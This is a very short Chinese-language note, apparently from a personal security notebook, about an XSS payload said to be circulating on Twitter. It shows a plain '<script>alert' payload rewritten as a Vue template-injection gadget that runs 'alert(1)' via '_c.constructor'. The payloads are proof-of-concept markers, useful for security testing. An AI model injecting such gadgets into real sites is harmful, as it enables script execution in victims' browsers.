2、twitter上最新xss payload：
```
<script>alert("ybdt")</script>
```
变为
```
<x v-html=_c.constructor('alert(1)')()>
```
